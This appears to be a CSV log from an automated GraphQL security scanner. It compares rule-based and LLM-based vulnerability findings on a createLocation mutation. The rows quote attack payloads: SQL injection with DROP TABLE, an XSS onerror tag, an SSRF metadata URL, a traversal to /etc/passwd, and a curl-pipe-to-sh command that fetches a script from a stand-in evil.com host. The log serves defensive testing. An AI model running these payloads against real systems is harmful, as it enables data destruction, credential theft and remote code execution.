timestamp,node_name,response_status,simple_count,llm_count,agreement_score,consensus,common_categories,simple_unique,llm_unique,simple_vulnerable_count,simple_potential_count,simple_safe_count,llm_vulnerable_count,llm_potential_count,llm_safe_count,potential_agreement_score,potential_consensus,common_potential_categories,simple_unique_potential,llm_unique_potential,simple_results,llm_results
2025-10-07T02:15:18.253984,createLocation_response_2,200,1,1,1.0,both_detected,Injection Attacks,,,0,1,0,1,0,0,0.0,simple_potential_only,,Injection Attacks,,"[{""detection_name"": ""SQL Injection (SQLi) Injection"", ""detection"": ""potential"", ""category"": ""Injection Attacks"", ""description"": ""SQL injection vulnerability detected - malicious SQL patterns found in response"", ""evidence"": ""Response status: 200, SQL patterns detected in response""}]","[{""detection_name"": ""LLM: sql_injection"", ""detection"": ""vulnerable"", ""category"": ""Injection Attacks"", ""description"": ""The GraphQL response contains a SQL injection payload (' OR 1=1; DROP TABLE locations;--) in the 'name' field. This payload demonstrates an attempt to manipulate database queries by terminating the original SQL statement and injecting malicious commands (DROP TABLE). While the 200 status code suggests the request was accepted, the presence of unsanitized SQL control characters in a GraphQL mutation input strongly indicates insufficient input validation and a potential SQL injection vulnerability if the backend uses string concatenation/interpolation for database queries."", ""evidence"": ""name: \""Lobby' OR 1=1; DROP TABLE locations;--\"""", ""confidence"": 0.7, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""sql_injection"", ""severity"": ""CRITICAL"", ""confidence"": 0.7, ""evidence"": ""name: \""Lobby' OR 1=1; DROP TABLE locations;--\"""", ""explanation"": ""The GraphQL response contains a SQL injection payload (' OR 1=1; DROP TABLE locations;--) in the 'name' field. This payload demonstrates an attempt to manipulate database queries by terminating the original SQL statement and injecting malicious commands (DROP TABLE). While the 200 status code suggests the request was accepted, the presence of unsanitized SQL control characters in a GraphQL mutation input strongly indicates insufficient input validation and a potential SQL injection vulnerability if the backend uses string concatenation/interpolation for database queries.""}}]"
2025-10-07T02:15:24.064363,createLocation_response_3,200,1,1,1.0,both_detected,Injection Attacks,,,0,1,0,1,0,0,0.0,simple_potential_only,,Injection Attacks,,"[{""detection_name"": ""Cross-Site Scripting (XSS) Injection"", ""detection"": ""potential"", ""category"": ""Injection Attacks"", ""description"": ""XSS injection vulnerability detected - malicious script patterns found in response"", ""evidence"": ""Response status: 200, XSS patterns detected in response data""}]","[{""detection_name"": ""LLM: xss_injection"", ""detection"": ""vulnerable"", ""category"": ""Injection Attacks"", ""description"": ""The response contains a stored HTML payload (`<img src=x onerror=alert('XSS')>`) in the 'name' field. If this value is rendered unsanitized in a browser, it would trigger JavaScript execution via the `onerror` handler, indicating a reflected or stored XSS vulnerability. While GraphQL itself doesn't directly execute client-side code, improper escaping by the client consuming this API response could lead to exploitation."", ""evidence"": ""name: \""<img src=x onerror=alert('XSS')>\"""", ""confidence"": 0.95, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""xss_injection"", ""severity"": ""HIGH"", ""confidence"": 0.95, ""evidence"": ""name: \""<img src=x onerror=alert('XSS')>\"""", ""explanation"": ""The response contains a stored HTML payload (`<img src=x onerror=alert('XSS')>`) in the 'name' field. If this value is rendered unsanitized in a browser, it would trigger JavaScript execution via the `onerror` handler, indicating a reflected or stored XSS vulnerability. While GraphQL itself doesn't directly execute client-side code, improper escaping by the client consuming this API response could lead to exploitation.""}}]"
2025-10-07T02:15:28.625207,createLocation_response_4,200,1,1,1.0,both_detected,Injection Attacks,,,0,1,0,1,0,0,0.0,simple_potential_only,,Injection Attacks,,"[{""detection_name"": ""Server-Side Request Forgery (SSRF) Injection"", ""detection"": ""potential"", ""category"": ""Injection Attacks"", ""description"": ""SSRF injection vulnerability detected - internal network access patterns found"", ""evidence"": ""Response status: 200, SSRF keywords detected in response""}]","[{""detection_name"": ""LLM: ssrf_injection"", ""detection"": ""vulnerable"", ""category"": ""Injection Attacks"", ""description"": ""The response contains a URL pointing to 169.254.169.254, a well-known AWS metadata service endpoint. This strongly suggests the server processed a request to an internal/cloud metadata service, which is a classic SSRF indicator. The presence of this URL in the response implies the server may have made an internal network request based on user-controlled input."", ""evidence"": ""name: 'http://169.254.169.254/latest/meta-data'"", ""confidence"": 0.95, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""ssrf_injection"", ""severity"": ""CRITICAL"", ""confidence"": 0.95, ""evidence"": ""name: 'http://169.254.169.254/latest/meta-data'"", ""explanation"": ""The response contains a URL pointing to 169.254.169.254, a well-known AWS metadata service endpoint. This strongly suggests the server processed a request to an internal/cloud metadata service, which is a classic SSRF indicator. The presence of this URL in the response implies the server may have made an internal network request based on user-controlled input.""}}]"
2025-10-07T02:15:35.592897,createLocation_response_5,200,0,1,0.0,llm_only,,,Injection Attacks,0,0,0,1,0,0,0.0,no_potential,,,,[],"[{""detection_name"": ""LLM: os_command_injection"", ""detection"": ""vulnerable"", ""category"": ""Injection Attacks"", ""description"": ""The payload in the 'name' field contains a semicolon (command separator) followed by a curl pipe to sh, indicating an attempt to execute arbitrary system commands. This suggests improper input sanitization in a backend system call that processes user-supplied data."", ""evidence"": ""name: \""; curl https://evil.com/exploit.sh | sh\"""", ""confidence"": 0.9, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""os_command_injection"", ""severity"": ""CRITICAL"", ""confidence"": 0.9, ""evidence"": ""name: \""; curl https://evil.com/exploit.sh | sh\"""", ""explanation"": ""The payload in the 'name' field contains a semicolon (command separator) followed by a curl pipe to sh, indicating an attempt to execute arbitrary system commands. This suggests improper input sanitization in a backend system call that processes user-supplied data.""}}]"
2025-10-07T02:15:42.459121,createLocation_response_6,200,1,1,1.0,both_detected,Injection Attacks,,,0,1,0,1,0,0,0.0,simple_potential_only,,Injection Attacks,,"[{""detection_name"": ""Path Injection"", ""detection"": ""potential"", ""category"": ""Injection Attacks"", ""description"": ""Path injection vulnerability detected - file system access patterns found"", ""evidence"": ""Response status: 200, Path injection patterns detected in response""}]","[{""detection_name"": ""LLM: path_injection"", ""detection"": ""vulnerable"", ""category"": ""Injection Attacks"", ""description"": ""The response indicates the GraphQL mutation 'createLocation' accepted a payload with '../../../etc/passwd' as a parameter. This is a clear directory traversal attempt to access the /etc/passwd file, a common target for path injection attacks. The 200 status code suggests the server processed this input without proper validation/sanitization, implying potential file system access vulnerability."", ""evidence"": ""The 'name' field contains '../../../etc/passwd', a directory traversal payload targeting a sensitive system file."", ""confidence"": 0.95, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""path_injection"", ""severity"": ""CRITICAL"", ""confidence"": 0.95, ""evidence"": ""The 'name' field contains '../../../etc/passwd', a directory traversal payload targeting a sensitive system file."", ""explanation"": ""The response indicates the GraphQL mutation 'createLocation' accepted a payload with '../../../etc/passwd' as a parameter. This is a clear directory traversal attempt to access the /etc/passwd file, a common target for path injection attacks. The 200 status code suggests the server processed this input without proper validation/sanitization, implying potential file system access vulnerability.""}}]"
2025-10-07T02:15:50.998402,createLocation_response_7,200,0,1,0.0,llm_only,,,Injection Attacks,0,0,0,0,1,0,0.0,llm_potential_only,,,Injection Attacks,[],"[{""detection_name"": ""LLM: html_injection"", ""detection"": ""potential"", ""category"": ""Injection Attacks"", ""description"": ""The response contains unsanitized HTML markup (<marquee> tag) in the 'name' field, indicating the application may be rendering user-supplied HTML without proper output encoding. While not directly executable code, this demonstrates HTML injection capability, which could be leveraged for layout manipulation, defacement, or as a precursor to XSS if other contexts/sanitization flaws exist."", ""evidence"": ""<marquee>Unauthorized Content</marquee> in 'name' field"", ""confidence"": 0.9, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""html_injection"", ""severity"": ""MEDIUM"", ""confidence"": 0.9, ""evidence"": ""<marquee>Unauthorized Content</marquee> in 'name' field"", ""explanation"": ""The response contains unsanitized HTML markup (<marquee> tag) in the 'name' field, indicating the application may be rendering user-supplied HTML without proper output encoding. While not directly executable code, this demonstrates HTML injection capability, which could be leveraged for layout manipulation, defacement, or as a precursor to XSS if other contexts/sanitization flaws exist.""}}]"
2025-10-07T02:16:03.744872,createLocation_response_8,,0,0,0.0,no_vulnerabilities,,,,0,0,0,0,0,0,0.0,no_potential,,,,[],[]
2025-10-07T02:16:15.727051,createLocation_response_9,,0,0,0.0,no_vulnerabilities,,,,0,0,0,0,0,0,0.0,no_potential,,,,[],[]
2025-10-07T02:16:46.350335,createLocation_response_10,400,0,0,0.0,no_vulnerabilities,,,,0,0,0,0,0,0,0.0,no_potential,,,,[],[]
2025-10-07T02:16:53.955004,createLocation_response_11,400,1,1,0.0,both_detected,,Information Disclosure,Unknown,1,0,0,0,0,1,0.0,no_potential,,,,"[{""detection_name"": ""Field Suggestions Enabled"", ""detection"": ""vulnerable"", ""category"": ""Information Disclosure"", ""description"": ""Field suggestions enabled - potential information disclosure"", ""evidence"": ""Found \""did you mean\"" in error message - field suggestions are enabled""}]","[{""detection_name"": ""LLM: field_suggestions"", ""detection"": ""safe"", ""category"": ""Unknown"", ""description"": ""The server returns field/argument suggestions when invalid names are provided (e.g., 'naem' -> 'name', 'nmae' -> 'name'). This exposes schema structure through error messages, aiding attackers in schema introspection and query crafting. While not directly exploitable, it increases the attacker's ability to probe the API effectively."", ""evidence"": ""Did you mean \""name\""? suggestions in both argument and field errors"", ""confidence"": 0.95, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""field_suggestions"", ""severity"": ""LOW"", ""confidence"": 0.95, ""evidence"": ""Did you mean \""name\""? suggestions in both argument and field errors"", ""explanation"": ""The server returns field/argument suggestions when invalid names are provided (e.g., 'naem' -> 'name', 'nmae' -> 'name'). This exposes schema structure through error messages, aiding attackers in schema introspection and query crafting. While not directly exploitable, it increases the attacker's ability to probe the API effectively.""}}]"
